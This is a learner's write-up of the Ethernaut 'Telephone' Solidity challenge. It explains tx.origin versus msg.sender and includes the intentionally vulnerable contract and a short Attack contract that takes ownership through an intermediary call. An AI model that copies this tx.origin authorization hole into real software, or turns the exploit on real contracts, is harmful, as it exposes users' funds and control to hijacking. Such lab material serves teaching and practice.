# Level 4 : Telephone Contract 

## Contract 

```solidity
// SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) { //msg.sender will be the contract attack 
            owner = _owner;
        }
    }
}
```
## Contract Overview

- Contract Telephone has :
    - `owner` - variable of address type that stores the address of the owner.

    - A `Constructor` that assigns the owner to msg.sender at the when deployed.

    - A `changeOwner` function that takes the input of address type `_owner` (that you want to make as owner ).

    - ```solidity
            if (tx.origin != msg.sender) { //msg.sender will be the contract attack 
            owner = _owner;
            }
            ```
    - This code snippet is a conditional statement in Solidity that checks if the original sender of the transaction `tx.origin` is different from the immediate caller of the current function `msg.sender`.

    - `tx.origin` - Represents the address of the Externally Owned Account (EOA) that initiated the entire sequence of calls leading to the execution of this code.
        - This global variable always represents the address of the original account that initiated the entire transaction. This account is always an Externally Owned Account (EOA) – a user's wallet. It remains constant throughout the entire chain of contract calls within that transaction.

        - example :

            - Alice (EOA) calls `ContractA.functionA()`

            - `functionA()` in `ContractA` then calls `ContractB.functionB()`

                - Inside `functionA()` in `ContractA`:

                    - `msg.sender` is Alice's address.

                    - `tx.origin` is Alice's address.

                - Inside `functionB()` in `ContractB`:

                    - `msg.sender` will be the address of ContractA.

                    - `tx.origin` will still be Alice's address.

    - If the Condition `(tx.origin != msg.sender)` is satisfied then the owner ship is tranferred from `owner` to `_owner` . 

## Challenge 

Claim ownership of the contract below to complete this level.

## Solution 

- Wrote an `Attack contract` 
    - ```solidity 
        // SPDX-License-Identifier:MIT
        pragma solidity ^0.8.0;

        import "./telephone-ethernaut.sol"; //import the telephone contract 
        contract Attack {
        Telephone telephone = Telephone(0x49A7e4307482f48B0980a412CEda05039a6DE077);//place the address where the telephone contract is deployed

        function changeOwner(address add) public{
        telephone.changeOwner(add);
        }
        }
        ```
    - In this we call the `changeOwner` function by passing an argument `add`  using its instance `telephone`. 


<a name='steps'></a>

    - **How it Works :** 

        1. Compile & Deploy the `telephone` contract (with address A).

        2. Place that address where the `telephone contract` deployed in the `Attack` Contract (see the code).

        3. Compile & Deploy the `Attack` contract now (with address B).

        4. Call the `changeOwner` function of `Attack` contract (with address D) by passing the `add` (address C).

        5. That `call` made in `Attack` contract calls the `changeOwner`  function of `telephone`

            - So the `tx.origin` gives address D and `msg.sender` gives the address of Contract B. Hence condtion is satisfied.

        6. Then finally the ownership changes from `owner` to `owner`(address c).

## How to run it on Remix Ide 

    Follow the above [steps](#steps)

## What I learnt 

1. What is  `tx.origin` and How it works in different Scenarioes.
2. `tx.origin` vs `msg.sender` . and How they behave when used together and what they returns in different Scenarioes.
